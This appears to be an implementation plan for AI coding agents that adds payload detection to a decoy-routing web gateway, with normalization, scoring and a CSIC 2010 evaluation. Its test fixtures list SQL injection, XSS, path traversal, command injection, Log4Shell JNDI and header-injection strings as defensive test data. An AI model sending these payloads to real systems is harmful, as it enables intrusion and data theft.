# Payload Detection Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Detect attack signatures in any common encoding and route a request carrying one to the decoy, without flagging legitimate traffic.

**Architecture:** A pure normalization module decodes and canonicalizes text; `payload_signals.py` runs a compiled regex catalog over the normalized path, query and body; `risk_engine.py` scores one high-risk indicator high enough to redirect. The proxy passes the content type through. An offline script measures the effect on CSIC 2010.

**Tech Stack:** Python 3.11+ stdlib (`re`, `urllib.parse`, `html`, `unicodedata`), FastAPI, pytest.

**Spec:** `docs/superpowers/specs/2026-11-07-payload-detection-design.md`

## Global Constraints

- Branch `feat/payload-detection`; commit messages carry **no** `Co-Authored-By` trailer.
- No new dependencies.
- Percent-decoding: at most **3** rounds; `+` decodes to a space.
- Detection body window: first **65,536** characters; `large-payload` threshold: `len(body) > 65536` bytes.
- Payload score: first high indicator **60**, each additional high **+10**, each medium **+8**, cap **80**.
- High labels: `sql-like`, `xss`, `path-traversal`, `rce-indicator`, `header-injection`, `null-byte`. Medium labels: `encoded`, `large-payload`, `unusual-content-type`.
- Allowed content types: `application/json`, `application/*+json`, `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`, `application/xml`, `text/xml` (media type compared case-insensitively, parameters such as `; charset=` ignored).
- A 65,536-character adversarial input is processed in **< 200 ms**.
- Feature names and `FEATURE_CONTRACT_VERSION` unchanged.
- All commands run from `apps/gateway` with `venv/Scripts/python.exe -m pytest` (CI: `pytest`); `ruff check .` from repo root must stay clean.

## Review Focus

1. **Non-UTF-8 bodies** (CSIC is Latin-1; binary uploads): detection must not raise and must still see ASCII attack text. Test in Task 2.
2. **Query strings whose parameters look like commands** (`?id=2&cmd=ls&sh=1`): `&` is never a command separator → no `rce-indicator`. Test in Task 2 benign corpus.
3. **Legitimate multi-line JSON/text bodies with `word:` lines**: raw newlines are not header injection; only encoded line breaks count. Test in Task 2.
4. **Callers that supply indicators directly** (`/api/v1/inspect`, `/simulate/*`, dataset preparation) keep working: new keyword argument is optional. Covered by the existing suite in every task's final run.
5. **Decode-expansion inputs** (`%2525252541…` chains): bounded by the 3-round cap; `decode_layers` never exceeds 3. Test in Task 1.

---

### Task 1: Normalization module

**Files:**
- Create: `apps/gateway/app/services/payload_normalization.py`
- Test: `apps/gateway/tests/test_payload_normalization.py`

**Interfaces:**
- Produces: `NormalizedPayload` (frozen dataclass: `text: str`, `decode_layers: int`) and `normalize_for_inspection(raw: str) -> NormalizedPayload`.

- [ ] **Step 1: Write the failing tests**

```python
def test_percent_and_plus_decoding():      # "id%3D1+union+select" -> text "id=1 union select", decode_layers 1
def test_double_encoding_counts_layers():  # "%2527" -> text "'", decode_layers 2
def test_decode_rounds_capped_at_three():  # "%25252527" -> text "%27", decode_layers 3  (Review Focus 5)
def test_json_unicode_escapes():           # "\\u003cscript\\u003e" -> "<script>"
def test_html_entities():                  # "&lt;img src=x onerror=alert(1)&gt;" -> "<img src=x onerror=alert(1)>"
def test_fullwidth_folded():               # "ＳＥＬＥＣＴ" -> "select"
def test_sql_inline_comment_removed():     # "UNION/**/SELECT" -> "union select"; "un/*x*/ion" -> "un ion"
def test_whitespace_collapsed_keeps_newlines():  # "a \t  b\r\nc" -> "a b\r\nc"
def test_invalid_sequences_preserved():    # "100%zz" -> "100%zz", decode_layers 0; "\\uZZZZ" unchanged
def test_plain_text_untouched():           # "hello" -> "hello", decode_layers 0
```

- [ ] **Step 2: Run** `venv/Scripts/python.exe -m pytest tests/test_payload_normalization.py -q` — Expected: FAIL (module not found).

- [ ] **Step 3: Implement `normalize_for_inspection` in `app/services/payload_normalization.py`** following the spec's six steps in order (`urllib.parse.unquote_plus` per round; `re.sub(r"\\u([0-9a-fA-F]{4})", …)`; `html.unescape`; `unicodedata.normalize("NFKC", …)`; `re.sub(r"/\*.{0,200}?\*/", " ", …, flags=re.S)`; `re.sub(r"[^\S\r\n]+", " ", …)`; `.lower()`).

- [ ] **Step 4: Run** the same command — Expected: 10 passed.

- [ ] **Step 5: Commit** `git commit -m "feat(gateway): normalize payload text before inspection"`

---

### Task 2: High-risk detection catalog

**Files:**
- Modify: `apps/gateway/app/services/payload_signals.py` (`detect_payload_indicators`)
- Test: `apps/gateway/tests/test_payload_signals.py` (new)

**Interfaces:**
- Consumes: `normalize_for_inspection` (Task 1).
- Produces: `detect_payload_indicators(path: str, query: str, body: bytes, *, content_type: str | None = None) -> list[str]` — sorted, unique labels. (`content_type` is accepted here and used in Task 3.)

- [ ] **Step 1: Write the failing tests**

```python
ATTACKS = [  # (path, query, body, expected_label)
    ("/api/products", "id=1%27%20UNION%20SELECT%20password%20FROM%20users", b"", "sql-like"),
    ("/api/products", "q=1+union+select+1", b"", "sql-like"),
    ("/api/products", "", b"1 UNION/**/SELECT 1", "sql-like"),
    ("/api/products", "", b"id=1' or '1'='1", "sql-like"),
    ("/api/products", "", b"x';waitfor delay '0:0:15';--", "sql-like"),
    ("/api/products", "", b"cantidad='; DROP TABLE usuarios; --", "sql-like"),
    ("/api/products", "q=%2527%2520or%25201%253D1", b"", "sql-like"),
    ("/api/products", "", "ＳＥＬＥＣＴ * ＦＲＯＭ users ＵＮＩＯＮ ＳＥＬＥＣＴ 1".encode(), "sql-like"),
    ("/api/products", "", b"<SCRipt>alert(1)</scrIPT>", "xss"),
    ("/api/products", "", b"&lt;img src=x onerror=alert(1)&gt;", "xss"),
    ("/api/products", "", b'{"bio": "\\u003cscript\\u003ealert(1)"}', "xss"),
    ("/api/products", "next=javascript:alert(1)", b"", "xss"),
    ("/api/files/..%2f..%2fetc/passwd", "", b"", "path-traversal"),
    ("/api/files", "f=%252e%252e%252fwin.ini", b"", "path-traversal"),
    ("/api/ping", "", b"host=8.8.8.8;cat /etc/hosts", "rce-indicator"),
    ("/api/ping", "", b"host=x|whoami", "rce-indicator"),
    ("/api/ping", "", b"${jndi:ldap://x/a}", "rce-indicator"),
    ("/api/ping", "", b"a=$(id)", "rce-indicator"),
    ("/api/register", "nombre=any%0d%0aSet-cookie:%20Tamper=1", b"", "header-injection"),
    ("/api/register", "", b"dni=%00&x=1", "null-byte"),
]

@pytest.mark.parametrize("path,query,body,label", ATTACKS)
def test_attack_detected(path, query, body, label): assert label in detect_payload_indicators(path, query, body)

BENIGN = [
    ("/api/users", "name=O%27Reilly", b""), ("/api/search", "q=Union+Square", b""),
    ("/api/products", "", b"Select your size"), ("/api/calc", "expr=2%2B2%3D4", b""),
    ("/api/furniture", "q=drop-leaf+table", b""), ("/api/checkout", "precio=85&cantidad=2", b""),
    ("/api/users", "", b'{"email": "ana@example.com", "note": "call me"}'),
    ("/api/notes", "", b'{"text": "line one\\nnote: x\\nsubject: y"}'),
    ("/api/notes", "", b"first line\r\nNote: second line"),          # Review Focus 3
    ("/api/items", "id=2&cmd=list&sh=1&ls=3", b""),                 # Review Focus 2
    ("/tienda1/publico/anadir.jsp", "id=1&nombre=Jam%F3n+Ib%E9rico&precio=85", b""),
]

@pytest.mark.parametrize("path,query,body", BENIGN)
def test_benign_not_flagged(path, query, body): assert detect_payload_indicators(path, query, body) == []

def test_latin1_body_does_not_raise():   # body=b"nombre=Jam\xf3n&x=' or 1=1--" -> "sql-like" in result  (Review Focus 1)
def test_output_sorted_and_unique():     # body with sqli twice and xss -> == ["sql-like", "xss"]
def test_adversarial_input_is_fast():    # body = (b"'" + b"%25" * 10 + b"or ") * 4000 truncated to 65536; time < 0.2 s
```

- [ ] **Step 2: Run** `venv/Scripts/python.exe -m pytest tests/test_payload_signals.py -q` — Expected: attack cases FAIL (encoded/new labels undetected).

- [ ] **Step 3: Rewrite `detect_payload_indicators`** with a module-level `_HIGH_RISK_PATTERNS: dict[str, tuple[re.Pattern[str], ...]]` built from the spec's high-risk table; apply to the normalized text of path, query and body separately. `header-injection` and `null-byte` check the **raw** lowercased input for `%0d`/`%0a`/`%00` (also after each decode layer, i.e. on the intermediate strings) as the spec requires. Keep `build_payload_excerpt` unchanged.

- [ ] **Step 4: Run** the test file, then the full suite. Expected: all pass. Run `ruff check .` from repo root: `All checks passed!`.

- [ ] **Step 5: Commit** `git commit -m "feat(gateway): detect encoded attack signatures"`

---

### Task 3: Medium-risk indicators and proxy content type

**Files:**
- Modify: `apps/gateway/app/services/payload_signals.py`, `apps/gateway/app/api/routes/proxy.py:50`
- Test: `apps/gateway/tests/test_payload_signals.py`

**Interfaces:**
- Consumes: `NormalizedPayload.decode_layers` (Task 1).

- [ ] **Step 1: Write the failing tests**

```python
def test_double_encoding_flags_encoded():          # query "q=%2541" -> "encoded" in result
def test_single_encoding_not_encoded():            # query "q=caf%C3%A9" -> "encoded" not in result
def test_inline_comment_between_words_flags_encoded():  # body b"un/**/ion" -> "encoded" in result
def test_large_payload():                          # body b"a" * 65537 -> "large-payload"; b"a" * 65536 -> not
def test_unusual_content_type():                   # body b"x", content_type "application/x-java-serialized-object" -> flagged
@pytest.mark.parametrize("ct", ["application/json; charset=utf-8", "application/vnd.api+json", "multipart/form-data; boundary=x", "TEXT/PLAIN"])
def test_allowed_content_types(ct):                # body b"x" -> "unusual-content-type" not in result
def test_content_type_ignored_without_body():      # body b"", content_type "application/octet-stream" -> not flagged
```

- [ ] **Step 2: Run** — Expected: FAIL.

- [ ] **Step 3: Implement** the three medium rules from the spec in `detect_payload_indicators`; in `proxy.py` pass `content_type=request.headers.get("content-type")`.

- [ ] **Step 4: Run** test file + full suite — Expected: all pass.

- [ ] **Step 5: Commit** `git commit -m "feat(gateway): emit encoded, large-payload and content-type indicators"`

---

### Task 4: Scoring policy and end-to-end routing

**Files:**
- Modify: `apps/gateway/app/services/risk_engine.py` (`HIGH_RISK_INDICATORS`, `_score_payload_indicators`)
- Test: `apps/gateway/tests/test_risk_engine.py`, `apps/gateway/tests/test_proxy.py`

- [ ] **Step 1: Write the failing tests**

```python
# test_risk_engine.py
def test_single_high_indicator_is_high():      # ["sql-like"] -> score 60.0, level HIGH
def test_additional_high_indicators_add_ten(): # ["sql-like","xss"] -> 70.0
def test_payload_score_capped_at_80():         # 4 high + 2 medium -> payload part 80 (score == 80.0 with neutral path/UA/count)
def test_new_high_labels_scored():             # ["header-injection"] -> 60.0; ["null-byte"] -> 60.0
def test_medium_only_stays_low():              # ["encoded"] -> 8.0, level LOW

# test_proxy.py  (browser UA "Mozilla/5.0 ... Chrome/120", path /api/products, fake_forward as in existing tests)
async def test_plain_sqli_body_reaches_decoy():        # body "id=1' or '1'='1" -> captured["is_decoy"] is True
async def test_encoded_sqli_query_reaches_decoy():     # GET ?id=1%27%20UNION%20SELECT%201 -> is_decoy True
async def test_double_encoded_traversal_reaches_decoy():  # GET /api/files?f=%252e%252e%252fwin.ini -> is_decoy True
async def test_benign_search_reaches_real_app():       # GET ?q=Union+Square -> is_decoy False
```

- [ ] **Step 2: Run** `venv/Scripts/python.exe -m pytest tests/test_risk_engine.py tests/test_proxy.py -q` — Expected: new tests FAIL.

- [ ] **Step 3: Implement** the spec's scoring in `_score_payload_indicators` and extend `HIGH_RISK_INDICATORS`. Reasons text format unchanged (`High-risk payload indicator: <label>` / `Medium-risk payload indicator: <label>`).

- [ ] **Step 4: Run** full suite — Expected: all pass (fix any existing test whose expectation encoded the old 20-point weight only if the spec's policy requires it; record each as a ruling).

- [ ] **Step 5: Commit** `git commit -m "feat(gateway): route single strong payload signals to the decoy"`

---

### Task 5: CSIC evaluation script and documentation

**Files:**
- Create: `apps/gateway/scripts/evaluate_payload_detection.py`
- Modify: `docs/dataset-preparation.md` (new section "Payload detection evaluation"), `README.md` ("What Works" bullet on encoded-payload detection)
- Test: `apps/gateway/tests/test_evaluate_payload_detection.py`

**Interfaces:**
- Produces: `evaluate(records: Iterable[CSICHTTPRequest]) -> dict[str, dict[str, float]]` keyed `"attack"`/`"normal"` with `flagged`, `redirect_to_decoy`, `monitor`, `allow` shares; CLI `python scripts/evaluate_payload_detection.py --csic-dir <dir>` printing them.

- [ ] **Step 1: Write the failing test** — `test_evaluate_counts_shares`: two synthetic `CSICHTTPRequest`-like records (one attack with `' or 1=1--` body, label 1; one normal, label 0) → `result["attack"]["redirect_to_decoy"] == 1.0`, `result["normal"]["allow"] == 1.0`.

- [ ] **Step 2: Run** — Expected: FAIL (module missing).

- [ ] **Step 3: Implement** the script (same routing setup as the spec's baseline: browser UA, request count 1, `routing_mode="heuristic"`; `sys.path` bootstrap like the other scripts).

- [ ] **Step 4: Run** test, then `venv/Scripts/python.exe scripts/evaluate_payload_detection.py --csic-dir data/csic-2010`. Expected: normal flagged ≤ 0.5%, attack decoy ≥ 7.2%. Record the exact figures (and the baseline 0.0%) in `docs/dataset-preparation.md`.

- [ ] **Step 5: Commit** `git commit -m "docs: measure payload detection on CSIC 2010"`
